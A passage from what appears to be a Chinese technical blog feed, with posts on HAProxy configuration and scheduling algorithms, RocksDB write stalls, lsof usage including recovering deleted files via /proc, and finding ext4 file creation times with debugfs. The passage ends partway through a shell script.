connect</code>：设置成功连接到一台服务器的最长等待时间，默认单位是毫秒，老版本使用<code>contimeout</code>替代；</p></li><li><p><code>timeout client</code>：设置连接客户端发送数据时的成功连接最长等待时间，默认单位是毫秒，老版本使用<code>clitimeout</code>替代；</p></li><li><p><code>timeout server</code>：设置服务器端回应客户度数据发送的最长等待时间，默认单位是毫秒，老版本使用<code>srvtimeout</code>替代；</p></li></ul><h4 id="2-4-3、listen配置"><a href="#2-4-3、listen配置" class="headerlink" title="2.4.3、listen配置"></a>2.4.3、listen配置</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">listen <span class="hljs-built_in">test</span><br>     <span class="hljs-built_in">bind</span> 0.0.0.0:1080<br>     mode tcp<br>     option tcplog<br>     maxconn 2000<br>     <span class="hljs-built_in">timeout</span> connect 5000<br>     <span class="hljs-built_in">timeout</span> client  50000<br>     <span class="hljs-built_in">timeout</span> server  50000<br>     option tcp-check<br>     server HTTPS1 192.0.2.1:443 ssl verify none socks4 127.0.0.1:1080 check inter 30000 fastinter 1000<br>     server HTTPS2 192.0.2.2:443 ssl verify none                       check inter 30000 fastinter 1000 backup<br></code></pre></td></tr></table></figure><p>部分参数同default的含义，以下只说明部分参数：</p><ul><li><code>server</code>：<ul><li><code>name</code>：名称；</li><li><code>weight</code>：服务器的权重；</li><li><code>check</code>：允许对该服务器进行健康检查；</li><li><code>inter</code>：设置连续的两次健康检查之间的时间，单位为毫秒(ms)，默认值 2000(ms)；</li><li><code>rise</code>：指定多少次成功的健康检查后，即可认定该服务器处于可用状态，默认值 2；</li><li><code>fall</code>：指定多少次不成功的健康检查后，认为服务器为不可用状态，默认值 3；</li><li><code>maxconn</code>：指定可被发送到该服务器的最大并发连接数；</li></ul></li></ul><p><strong>更多详细的配置文档位于源码包的<code>./examples/configuration.txt</code>文件中，也可<a href="http://www.haproxy.org/download/2.1/doc/configuration.txt">在线查看(2.1.2配置文档)</a>；</strong></p><h3 id="2-5、调度算法"><a href="#2-5、调度算法" class="headerlink" title="2.5、调度算法"></a>2.5、调度算法</h3><ul><li><code>roundrobin</code>：基于权重进行轮询，在服务器的处理时间保持均匀分布时，这是最平衡、最公平的算法；</li><li><code>static-rr</code>：基于权重进行轮询；</li><li><code>first</code>：第一个具有可用连接槽的服务器得到连接。这些服务器将从最小到最大的<code>id</code>选择，一旦一个服务器到达它的最大连接数，下一个服务器将被使用；如果不定义每个服务器的<code>maxconn</code>参数，这个算法是无意义的。使用这个算法的目的是尽量使用最小数量的服务器以便于其他服务器可以在非密集时段待机。这个算法将忽略服务器权重；</li><li><code>leastconn</code>：新的连接请求被派发至具有最少连接数目的后端服务器，在有着较长时间会话的场景中推荐使用此算法，如<code>LDAP</code>、<code>SQL</code>等；其并不太适用于较短会话的应用层协议，如<code>HTTP</code>；</li><li><code>random</code>：基于一个随机数作为一致性hash的key，随机负载平衡对于大型服务器场或经常添加或删除服务器非常有用，因为它可以避免在这种情况下由<code>roundrobin</code>或<code>leastconn</code>导致的<a href="%5Bhttps://zh.wikipedia.org/zh/%E6%B0%B4%E9%8C%98%E4%BD%9C%E7%94%A8%5D(https://zh.wikipedia.org/zh/%E6%B0%B4%E9%8C%98%E4%BD%9C%E7%94%A8)">水锤效应</a>；</li><li><code>source</code>：将请求的源地址进行hash运算，并由后端服务器的权重总数相除后派发至某匹配的服务器，这可以使得同一个客户端IP的请求始终被派发至某特定的服务器。不过当服务器权重总数发生变化时，如某服务器宕机或添加了新的服务器，许多客户端的请求可能会被派发至与此前请求不同的服务器。常用于负载均衡无<code>cookie</code>功能的基于<code>TCP</code>的协议；</li><li><code>uri</code>：对URI进行hash运算，并由服务器的总权重相除后派发至某匹配的服务器。这可以使得对同一个<code>URI</code>的请求总是被派发至某特定的服务器，除非服务器的权重总数发生了变化。此算法常用于代理缓存或反病毒代理以提高缓存的命中率。需要注意的是，此算法仅应用于HTTP后端服务器场景；</li><li><code>url_param</code>：通过&lt; argument&gt;为URL指定的参数在每个HTTP GET请求中将会被检索，如果找到了指定的参数且其通过等于号”&#x3D;”被赋予了一个值，那么此值将被执行hash运算并被服务器的总权重相除后派发至某匹配的服务器。此算法可以通过追踪请求中的用户标识进而确保同一个用户ID的请求将被送往同一个特定的服务器，除非服务器的总权重发生了变化。如果某请求中没有出现指定的参数或其没有有效值，则使用轮叫算法对相应请求进行调度；</li><li><code>hdr(name)</code>：对于每个<code>HTTP</code>请求，通过<code>&lt; name&gt;</code>指定的<code>HTTP</code>首部将会被检索。如果相应的首部没有出现或其没有有效值，则使用轮询算法对相应请求进行调度.其有一个可选选项<code>use_domain_only</code>，可在指定检索类似Host类的首部时仅计算域名部分(比如通过<code>www.bugwz.com</code>来说，仅计算<code>bugwz</code>字符串的hash值)以降低hash算法的运算量；</li><li><code>rdp-cookie(name)</code>：根据<code>cookie(name)</code>来锁定并哈希每一次<code>TCP</code>请求；</li></ul><p>参考地址：</p><ul><li><a href="http://vlambda.com/wz_5gLxSJYWQfp.html">http://vlambda.com/wz_5gLxSJYWQfp.html</a></li><li><a href="https://www.cnblogs.com/f-ck-need-u/p/8540805.html">https://www.cnblogs.com/f-ck-need-u/p/8540805.html</a></li><li><a href="http://blog.xiayf.cn/gitbook/tech-note/operation/haproxy.html">http://blog.xiayf.cn/gitbook/tech-note/operation/haproxy.html</a></li><li><a href="https://blog.51cto.com/leejia/1421882">https://blog.51cto.com/leejia/1421882</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HAProxy </tag>
            
            <tag> 高可用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RocksDB学习 - WriteStall (写停顿)</title>
      <link href="/2020/01/01/rocksdb-writestall/"/>
      <url>/2020/01/01/rocksdb-writestall/</url>
      
        <content type="html"><![CDATA[<h2 id="一、WriteStall-介绍"><a href="#一、WriteStall-介绍" class="headerlink" title="一、WriteStall 介绍"></a>一、WriteStall 介绍</h2><p>当 RocksDB 中的 Flush 或 Compaction 赶不上写入速度时，RocksDB 会降低写的速率，极端情况下会停止写入，通过使用这个策略来避免出现以下问题：</p><ul><li>空间放大，导致耗尽磁盘空间；</li><li>读放大， 导致降低读性能；</li></ul><h2 id="二、WriteStall-触发场景"><a href="#二、WriteStall-触发场景" class="headerlink" title="二、WriteStall 触发场景"></a>二、WriteStall 触发场景</h2><p>可能有以下的场景会触发 WriteStall ：</p><ul><li>Memtable 过多 </li><li>L0 层的 SST 文件过多</li><li>等待进行 Compaction 的字节太大</li></ul><h3 id="2-1、Memtable-过多"><a href="#2-1、Memtable-过多" class="headerlink" title="2.1、Memtable 过多"></a>2.1、Memtable 过多</h3><ul><li><strong>触发条件</strong>：<ul><li><strong>慢写</strong>：当 <code>max_write_buffer_number</code> 大于 <code>3</code>， 并且等待进行 Flush 的 MemTables 的个数大于等于 <code>max_write_buffer_number - 1</code> ，则会触发慢写；</li><li><strong>阻写</strong>：当等待进行 Flush 的 MemTables 的个数大于等于 <code>max_write_buffer_number</code> ，则会触发阻写，直到等到 Flush 完成；</li></ul></li><li><strong>异常感知</strong>：<ul><li><strong>监控</strong>：<ul><li><code>io_stalls.memtable_slowdown</code> </li><li><code>io_stalls.memtable_compaction</code></li></ul></li><li><strong>日志</strong>：<ul><li><code>[%s] Stalling writes because we have %d immutable memtables (waiting for flush), max_write_buffer_number is set to %d rate % PRIu64</code></li><li><code>[%s] Stopping writes because we have %d immutable memtables (waiting for flush), max_write_buffer_number is set to %d</code></li></ul></li></ul></li></ul><h3 id="2-2、L0-层的-SST-文件过多"><a href="#2-2、L0-层的-SST-文件过多" class="headerlink" title="2.2、L0 层的 SST 文件过多"></a>2.2、L0 层的 SST 文件过多</h3><ul><li><strong>触发条件</strong>：<ul><li><strong>慢写</strong>：当 L0 层的文件数量达到了 <code>level0_slowdown_writes_trigger</code> ，则触发慢写；</li><li><strong>阻写</strong>：当 L0 层的文件数量达到了 <code>level0_stop_writes_trigger</code> ， 则触发停写，直到 L0 层到 L1 层的 Compaction 减少了 L0 层的文件数量；</li></ul></li><li><strong>异常感知</strong>：<ul><li><strong>监控</strong>：<ul><li><code>io_stalls.level0_slowdown</code></li><li><code>io_stalls.level0_numfiles</code></li></ul></li><li><strong>日志</strong>：<ul><li><code>[%s] Stalling writes because we have %d level-0 files rate % PRIu64</code></li><li><code>[%s] Stopping writes because we have %d level-0 files</code></li></ul></li></ul></li></ul><h3 id="2-3、等待进行-Compaction-的字节太大"><a href="#2-3、等待进行-Compaction-的字节太大" class="headerlink" title="2.3、等待进行 Compaction 的字节太大"></a>2.3、等待进行 Compaction 的字节太大</h3><ul><li><strong>触发条件</strong>：<ul><li><strong>慢写</strong>：当需要进行 Compation 的字节数达到了 <code>soft_pending_compaction_bytes</code> ，则触发慢写；</li><li><strong>阻写</strong>：当需要进行 Compation 的字节数达到了 <code>hard_pending_compaction_bytes</code> ，则触发阻写；</li></ul></li><li><strong>异常感知</strong>：<ul><li><strong>监控</strong>：<ul><li><code>io_stalls.slowdown_for_pending_compaction_bytes</code></li><li><code>io_stalls.stop_for_pending_compaction_bytes</code></li></ul></li><li><strong>日志</strong>：<ul><li><code>[%s] Stopping writes because of estimated pending compaction bytes % PRIu64</code></li><li><code>[%s] Stalling writes because of estimated pending compaction bytes % PRIu64 rate %</code></li></ul></li></ul></li></ul><h2 id="三、WriteStall-实现细节"><a href="#三、WriteStall-实现细节" class="headerlink" title="三、WriteStall 实现细节"></a>三、WriteStall 实现细节</h2><h3 id="3-1、WriteStall-速率计算规则"><a href="#3-1、WriteStall-速率计算规则" class="headerlink" title="3.1、WriteStall 速率计算规则"></a>3.1、WriteStall 速率计算规则</h3><ul><li><strong><code>SetupDelay 函数</code> 速率计算逻辑</strong>：<ul><li>最小的写入速率为 <code>kMinWriteRate</code> （默认为 <code>16KB/s</code>）；</li><li>最大的写入速率为 <code>max_delayed_write_rate_</code> （默认为 <code>32MB/s</code>）；</li><li><strong>以下三种情况选其一</strong>：<ul><li>需要进行 <code>惩罚性写限速 (Penalize Stop)</code>（为了避免直接进行阻写而产生的影响），则本次的写速率设置为上一次写速率的 <code>kNearStopSlowdownRatio 倍</code>（默认为 <code>0.6 倍</code>） ；</li><li>本次需要进行 Compation 的字节大小比上一次的要大，则本次的写速率设置为上一次写速率的 <code>kIncSlowdownRatio 倍</code>（默认为 <code>0.8 倍</code>） ；</li><li>本次需要进行 Compation 的字节大小比上一次的要小，则本次的写速率设置为上一次写速率的 <code>kDecSlowdownRatio 倍</code>（默认为 <code>1.25 倍</code>） ；</li></ul></li></ul></li><li><strong>不同场景下的新的写入速率设置</strong>：<ul><li><strong>Memtable 过多</strong>：遵循以上规则；</li><li><strong>L0 层的 SST 文件过多</strong>：L0 层触发 Delay 的计数大于 <code>level0_stop_writes_trigger - 2</code>，则触发 <code>惩罚性写限速</code>；</li><li><strong>等待进行 Compaction 的字节太大</strong>：如果到硬限制的距离小于软字节限制和硬字节限制之间的间隙的 <code>1/4</code>，我们认为它接近停止并加速了减速，则触发 <code>惩罚性写限速</code>；<ul><li><strong>计算规则</strong>：<code>mutable_cf_options.hard_pending_compaction_bytes_limit &gt; 0 &amp;&amp; (compaction_needed_bytes - mutable_cf_options.soft_pending_compaction_bytes_limit) &gt; 3 * (mutable_cf_options.hard_pending_compaction_bytes_limit - mutable_cf_options.soft_pending_compaction_bytes_limit) / 4</code> ；</li></ul></li></ul></li></ul><h3 id="3-2、WriteStall-影响"><a href="#3-2、WriteStall-影响" class="headerlink" title="3.2、WriteStall 影响"></a>3.2、WriteStall 影响</h3><ul><li>如果触发 WriteStall，执行 Put&#x2F;Merge&#x2F;Delete 等的应用程序线程将阻塞；</li><li>如果触发 <strong>慢写</strong>，则每次写入都会在继续之前休眠一段时间（通常为 1 毫秒）；</li><li>如果触发 <strong>阻写</strong>，则线程可以无限期地阻塞；</li><li>如果某个 CF 触发了 WriteStall, 整个DB都会 Stall (延缓)；</li><li>如果不希望阻塞线程，应用程序可以通过设置 <code>no_slowdown = true</code> 来避免 WriteStall；</li></ul><h3 id="3-3、WriteStall-动态调整"><a href="#3-3、WriteStall-动态调整" class="headerlink" title="3.3、WriteStall 动态调整"></a>3.3、WriteStall 动态调整</h3><p>根据不同的 WriteStall 的触发场景，我们可以通过调整一些参数来控制 WriteStall 的触发概率或者直接禁止 WriteStall 的出现，不同的触发场景的处理手段如下：</p><ul><li><strong>Memtable 过多</strong>：<ul><li>增加 <code>max_background_flushes</code> 使更多的 Thread 用来 Flush；</li></ul><ul><li>增加 <code>max_write_buffer_number</code> 使有更小的 MemTable 来 Flush；</li></ul></li><li><strong>L0 层的 SST 文件过多</strong> 或者 <strong>等待进行 Compaction 的字节太大</strong>：<ul><li>增加 <code>max_background_jobs</code> 以拥有更多的压缩线程；</li></ul><ul><li>增加 <code>write_buffer_size</code> 有大内存表，以减少写放大；</li><li>增加 <code>min_write_buffer_number_to_merge</code> ；</li></ul></li></ul><h3 id="3-4、相关代码"><a href="#3-4、相关代码" class="headerlink" title="3.4、相关代码"></a>3.4、相关代码</h3><ul><li><strong>相关函数</strong>：<ul><li><code>ColumnFamilyData::RecalculateWriteStallConditions</code><ul><li>含义：判断当前的是否需要进行写控制；</li></ul></li><li><code>SetupDelay</code><ul><li>含义：慢写入的情况下，设置下一次的写速率；</li></ul></li></ul></li><li><strong>相关变量</strong>：<ul><li><code>write_stall_condition</code> ：<ul><li>含义：局部变量，标记当前最新的 WriteStall 的状态；</li><li>可选值：<ul><li><code>WriteStallCondition::kNormal</code> ：初始状态；</li><li><code>WriteStallCondition::kDelayed</code> ：触发软限制，对写入执行限速；</li><li><code>WriteStallCondition::kStopped</code> ：触发硬限制，阻止写入请求；</li></ul></li></ul></li><li><code>write_stall_cause</code> ：<ul><li>含义：局部变量，标记触发 WriteStall 的原因；</li><li>可选值：<ul><li><code>WriteStallCause::kNone</code> ：初始状态；</li><li><code>WriteStallCause::kMemtableLimit</code> ：由 Memtable 过多触发；</li><li><code>WriteStallCause::kL0FileCountLimit</code> ：由 L0 层的 SST 文件过多触发；</li><li><code>WriteStallCause::kPendingCompactionBytes</code> ：由 等待进行 Compaction 的字节太大触发；</li></ul></li></ul></li><li><code>write_controller_token_</code> ：<ul><li>含义：<code>ColumnFamilyData</code> 类的成员变量，写控制令牌；</li></ul></li></ul></li><li><strong>相关类</strong>：<ul><li><code>WriteController</code> ：<ul><li>含义：控制写入请求；</li><li>重点函数：<ul><li><code>NeedsDelay</code> ：判断是否需要进行慢写；</li><li><code>WriteController::IsStopped</code> ：判断是否需要进行阻写；</li></ul></li></ul></li></ul></li></ul><h2 id="四、参考资料"><a href="#四、参考资料" class="headerlink" title="四、参考资料"></a>四、参考资料</h2><ul><li><a href="https://github.com/facebook/rocksdb/wiki/Write-Stalls">RocksDB Wiki - WriteStalls</a></li><li><a href="https://www.jianshu.com/p/2e28b1453642">rocksdb系列之write stall</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> RocksDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lsof指令的使用 - 每周指令</title>
      <link href="/2019/12/12/command-lsof/"/>
      <url>/2019/12/12/command-lsof/</url>
      
        <content type="html"><![CDATA[<p><code>lsof（list open files）</code>是一个列出当前系统打开文件的工具。在Linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。所以如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等，系统在后台都为该应用程序分配了一个文件描述符，无论这个文件的本质如何，该文件描述符为应用程序与基础操作系统之间的交互提供了通用接口。因为应用程序打开文件的描述符列表提供了大量关于这个应用程序本身的信息，因此通过lsof工具能够查看这个列表对系统监测以及排错将是很有帮助的。</p><h2 id="一、参数解析"><a href="#一、参数解析" class="headerlink" title="一、参数解析"></a>一、参数解析</h2><p>使用的版本为<code>4.8.2</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">-a：列出打开文件存在的进程；<br>-c&lt;进程名&gt;：列出指定进程所打开的文件；<br>-g：列出GID号进程详情；<br>-d&lt;文件号&gt;：列出占用该文件号的进程；<br>-n&lt;目录&gt;：列出使用NFS的文件；<br>-i&lt;条件&gt;：列出符合条件的进程(4、6、协议、:端口、 @ip )；<br>-p&lt;进程号&gt;：列出指定进程号所打开的文件；<br>-R：列出父进程的pid；<br>-u：列出UID号进程详情；<br>-h：显示帮助信息；<br>-v：显示版本信息；<br></code></pre></td></tr></table></figure><p><strong>各列的含义解释：</strong></p><ul><li><code>COMMAND</code>：进程的名称；</li><li><code>PID</code>：进程标识符；</li><li><code>PPID</code>：父进程标识符(需要指定-R参数)；</li><li><code>PGID</code>：进程组的ID编号(需要指定-g参数)；</li><li><code>USER</code>：进程所有者；命令的执行UID或系统中登陆的用户名称。默认显示为用户名，当使用-l参数时，可显示<code>UID</code>。</li><li><code>FD</code>：文件描述符，应用程序通过文件描述符识别该文件；<ul><li><code>cwd</code>：表示current work dirctory，即应用程序的当前工作目录，这是该应用程序启动的目录，除非它本身对这个目录进行更改；</li><li><code>txt</code>：该类型的文件是程序代码，如应用程序二进制文件本身或共享库，如上列表中显示的 &#x2F;sbin&#x2F;init 程序；</li><li><code>lnn</code>：表示library references (AIX)，即库引用；</li><li><code>er</code>：表示FD information error (see NAME column)，即FD错误信息；</li><li><code>ltx</code>：表示shared library text (code and data)，即共享库文本；</li><li><code>mxx</code>：表示hex memory-mapped type number xx，即十六进制内存映射类型号xx；</li><li><code>m86</code>：表示DOS Merge mapped file，即DOS合并映射文件；</li><li><code>mem</code>：表示memory-mapped file，即内存映射文件；</li><li><code>mmap</code>：表示memory-mapped device，即内存映射设备；</li><li><code>pd</code>：表示parent directory，即父目录；</li><li><code>rtd</code>：表示root directory，即根目录；</li><li><code>v86</code>：表示VP&#x2F;ix mapped file，即VP&#x2F;ix映射文件；</li><li><code>0</code>：表示标准输出；</li><li><code>1</code>：表示标准输入；</li><li><code>2</code>：表示标准错误；<ul><li><strong>一般在标准输出、标准错误、标准输入后还跟着文件状态模式：r、w、u等：</strong></li><li><code>u</code>：表示该文件被打开并处于读取&#x2F;写入模式</li><li><code>r</code>：表示该文件被打开并处于只读模式</li><li><code>w</code>：表示该文件被打开并处于</li><li><code>空格</code>：表示该文件的状态模式为unknow，且没有锁定</li><li><code>-</code>：表示该文件的状态模式为unknow，且被锁定<ul><li><strong>同时在文件状态模式后面，还跟着相关的锁</strong></li><li><code>N</code>：for a Solaris NFS lock of unknown type（对于未知类型的Solaris NFS锁）；</li><li><code>r</code>：for read lock on part of the file（文件部分的读锁）；</li><li><code>R</code>：for a read lock on the entire file（整个文件的读锁）；</li><li><code>w</code>：for a write lock on part of the file（文件的部分写锁）；</li><li><code>W</code>：for a write lock on the entire file（整个文件的写锁）；</li><li><code>u</code>：for a read and write lock of any length（对于任何长度的读写锁）；</li><li><code>U</code>：for a lock of unknown type（对于未知类型的锁）；</li><li><code>x</code>：for an SCO OpenServer Xenix lock on part of the file（对于部分文件的SCO OpenServer Xenix锁）；</li><li><code>X</code>：for an SCO OpenServer Xenix lock on the entire file（对于整个文件的SCO OpenServer Xenix锁）；</li><li><code>space</code>：if there is no lock（没有锁）；</li></ul></li></ul></li></ul></li><li><code>TYPE</code>：<ul><li><code>CHR</code>：字符类型；</li><li><code>REG</code>：文件类型；</li><li><code>DIR</code>：目录；</li><li><code>BLK</code>：块设备类型；</li><li><code>LINK</code>：链接文件；</li><li><code>FIFO</code>：先进先出 (FIFO) 队列；</li><li><code>IPv4</code>：IPv4的包；</li><li><code>IPv6</code>：IPv6的包，即使地址是IPv4的，也会显示为IPv6，而映射到IPv6的地址；</li><li><code>0000</code>：</li><li><code>unix</code>：</li></ul></li><li><code>DEVICE</code>：使用character special、block special表示的磁盘名称；</li><li><code>SIZE/OFF</code>：文件的大小，如果不能用大小表示的，会留空。使用<code>-s</code>参数控制；</li><li><code>NODE</code>：本地文件的node码，或者协议，如TCP等；</li><li><code>NAME</code>：挂载点和文件的全路径（链接会被解析为实际路径），或者连接双方的地址和端口、状态等；</li></ul><h2 id="二、使用技巧"><a href="#二、使用技巧" class="headerlink" title="二、使用技巧"></a>二、使用技巧</h2><h3 id="2-1、恢复已经删除的文件"><a href="#2-1、恢复已经删除的文件" class="headerlink" title="2.1、恢复已经删除的文件"></a>2.1、恢复已经删除的文件</h3><p>当进程打开了某个文件时，只要该进程保持打开该文件，即使将其删除，它依然存在于磁盘中。这意味着，进程并不知道文件已经被删除，它仍然可以向打开该文件时提供给它的文件描述符进行读取和写入。除了该进程之外，这个文件是不可见的，因为已经删除了其相应的目录索引节点，具体恢复步骤如下所示：</p><ul><li><p>找到指定的已经被删除的文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz ~]# lsof -R /data1 | grep deleted<br><span class="hljs-built_in">test</span> 16578    1 nosql   11r   REG 253,17 2400000683 39846050 /data/test.log (deleted)<br></code></pre></td></tr></table></figure></li><li><p>依据进程的pid（16578）和文件的fd的id（11）信息，找到指定的文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz ~]# ll /proc/16578/fd/11<br>lr-x------ 1 root root 64 Dec 12 12:20 /proc/16578/fd/11 -&gt; /data/test.log (deleted)<br></code></pre></td></tr></table></figure></li><li><p>尝试查看该文件中的信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz ~]# <span class="hljs-built_in">head</span> -n 1 /proc/16578/fd/11<br>[16578] 12 Dec 12:20:00 * Start <span class="hljs-built_in">test</span> process...<br></code></pre></td></tr></table></figure></li><li><p>尝试恢复该文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz /]# <span class="hljs-built_in">cat</span> /proc/16578/fd/11 &gt; /data/test.log<br>[root@bugwz /]# ll /data/<br>total 2400000683<br>-rw-r--r-- 1 root  root  2400000683 Dec 12 14:17 test.log<br>[root@bugwz /]# <span class="hljs-built_in">head</span> -n 1 /proc/16578/fd/11<br>[16578] 12 Dec 12:20:00 * Start <span class="hljs-built_in">test</span> process...<br></code></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> lsof </tag>
            
            <tag> 常用命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下查看文件的创建时间</title>
      <link href="/2019/12/12/linux-ext4-crtime/"/>
      <url>/2019/12/12/linux-ext4-crtime/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>Linux</code>的文件能否找到文件的创建时间取决于文件系统类型，在<a href="https://ext4.wiki.kernel.org/index.php/Ext4_Disk_Layout">ext4</a>之前的早期文件系统中（<code>ext</code>、<code>ext2</code>、<code>ext3</code>），文件的元数据不会记录文件的创建时间，它只会记录访问时间、修改时间、更改时间（状态更改时间）。典型的文件的基础信息如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz ～]# <span class="hljs-built_in">stat</span> test.file<br>  File: ‘test.file’<br>  Size: 2         Blocks: 8          IO Block: 4096   regular file<br>Device: 807h/2055dInode: 5255117     Links: 1<br>Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)<br>Access: 2019-12-12 19:11:33.175841399 +0800<br>Modify: 2019-12-12 19:11:37.564970487 +0800<br>Change: 2019-12-12 19:11:43.079132663 +0800<br> Birth: -<br></code></pre></td></tr></table></figure><ul><li><code>Access</code>：访问时间，文件数据的最后访问时间（例如：读文件内容）；</li><li><code>Modify</code>：修改时间，文件数据的最后修改时间。（例如：修改文件内容）；</li><li><code>Change</code>：状态更改时间，这个跟 Modify 时间很容易混淆，文件的属性（权限，大小等）的变更时间；</li></ul><h2 id="二、实践"><a href="#二、实践" class="headerlink" title="二、实践"></a>二、实践</h2><h3 id="2-1、获取文件的创建时间"><a href="#2-1、获取文件的创建时间" class="headerlink" title="2.1、获取文件的创建时间"></a>2.1、获取文件的创建时间</h3><ul><li>获取文件<code>inode</code>号，如下所示，拿到<code>inode</code>号为：<code>5255117</code>；</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz data]# <span class="hljs-built_in">stat</span> /data/test.file<br>  File: ‘/data/test.file’<br>  Size: 2         Blocks: 8          IO Block: 4096   regular file<br>Device: 807h/2055dInode: 5255117     Links: 1<br>Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)<br>Access: 2019-12-12 19:11:33.175841399 +0800<br>Modify: 2019-12-12 19:11:37.564970487 +0800<br>Change: 2019-12-12 19:11:43.079132663 +0800<br> Birth: -<br></code></pre></td></tr></table></figure><ul><li>查找文件所在的磁盘路径，如下所示，拿到磁盘路径为：<code>/dev/sda7</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz data]# <span class="hljs-built_in">df</span> -h<br>Filesystem      Size  Used Avail Use% Mounted on<br>/dev/sda3       3.9G  2.5G  1.2G  70% /<br>devtmpfs         16G     0   16G   0% /dev<br>tmpfs            16G     0   16G   0% /dev/shm<br>tmpfs            16G  1.7G   14G  11% /run<br>tmpfs            16G     0   16G   0% /sys/fs/cgroup<br>/dev/sda1        12G   11G  787M  94% /usr<br>/dev/sda5       7.8G  4.2G  3.2G  57% /tmp<br>/dev/sda7       235G  180G   44G  81% /data<br>/dev/sda6       7.8G  2.1G  5.3G  29% /var<br></code></pre></td></tr></table></figure><ul><li>使用<code>debugfs</code>查看文件的创建时间，发现创建时间<code>crtime</code>为：<code>Thu Dec 12 19:05:23 2019</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz data1]# debugfs -R <span class="hljs-string">&#x27;stat &lt;5255117&gt;&#x27;</span> /dev/sda7<br>debugfs 1.42.9 (28-Dec-2013)<br>Inode: 5255117   Type: regular    Mode:  0755   Flags: 0x80000<br>Generation: 758605841    Version: 0x00000000:00000001<br>User:     0   Group:     0   Size: 2<br>File ACL: 0    Directory ACL: 0<br>Links: 1   Blockcount: 8<br>Fragment:  Address: 0    Number: 0    Size: 0<br> ctime: 0x5df2206f:12dddfdc -- Thu Dec 12 19:11:43 2019<br> atime: 0x5df22065:29ec81dc -- Thu Dec 12 19:11:33 2019<br> mtime: 0x5df22069:86b30fdc -- Thu Dec 12 19:11:37 2019<br>crtime: 0x5df21ef3:d586ca44 -- Thu Dec 12 19:05:23 2019<br>Size of extra inode fields: 28<br>EXTENTS:<br>(0):16949121<br></code></pre></td></tr></table></figure><h3 id="2-2、集成脚本："><a href="#2-2、集成脚本：" class="headerlink" title="2.2、集成脚本："></a>2.2、集成脚本：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>[ <span class="hljs-variable">$#</span> -ne 1 ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage:     <span class="hljs-variable">$0</span> &#123;FILENAME&#125;&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span> 1<br><br>INODE=`<span class="hljs-built_in">ls</span> -i <span class="hljs-variable">$1</span> |awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br>FILENAME=<span class="hljs-variable">$1</span><br><br><span class="hljs-comment"># 如果传入参数带/，则获取这个传入参数的目录路径并进入目录</span><br>`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$FILENAME</span> | grep / 1&gt; /dev/null`  &amp;&amp;  &#123; FPWD=<span class="hljs-variable">$&#123;FILENAME%/*&#125;</span>;FPWD=<span class="hljs-variable">$&#123;FPWD:=/&#125;</span>;<span class="hljs-built_in">cd</span> <span class="hljs-variable">$&#123;FPWD&#125;</span>;FPWD=`<span class="hljs-built_in">pwd</span>`; &#125;  || FPWD=`<span class="hljs-built_in">pwd</span>`<br><br>array=(`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;FPWD&#125;</span> | sed <span class="hljs-string">&#x27;s@/@ @g&#x27;</span>`)<br>array_length=<span class="hljs-variable">$&#123;#array[@]&#125;</span><br><br><span class="hljs-keyword">for</span> ((i=<span class="hljs-variable">$&#123;array_length&#125;</span>;i&gt;=<span class="hljs-number">0</span>;i--)); <span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">unset</span> array[<span class="hljs-variable">$i</span>]<br>  SUBPWD=`<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; &quot;</span><span class="hljs-variable">$&#123;array[@]&#125;</span> | sed <span class="hljs-string">&#x27;s@ @/@g&#x27;</span>`<br>  DISK=`<span class="hljs-built_in">df</span> -h |grep <span class="hljs-variable">$&#123;SUBPWD&#125;</span>$ |awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br>  [[ -n <span class="hljs-variable">$DISK</span> ]] &amp;&amp; <span class="hljs-built_in">break</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># 文件系统非ext4则退出</span><br>[[ <span class="hljs-string">&quot;`df -T | grep <span class="hljs-variable">$&#123;DISK&#125;</span> |awk &#x27;&#123;print <span class="hljs-variable">$2</span>&#125;&#x27;`&quot;</span> != <span class="hljs-string">&quot;ext4&quot;</span> ]] &amp;&amp; &#123; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;DISK&#125;</span> is not mount on <span class="hljs-built_in">type</span> ext4! Only ext4 file system support!;<span class="hljs-built_in">exit</span> 2; &#125;<br><br>debugfs -R <span class="hljs-string">&quot;stat &lt;<span class="hljs-variable">$&#123;INODE&#125;</span>&gt;&quot;</span> <span 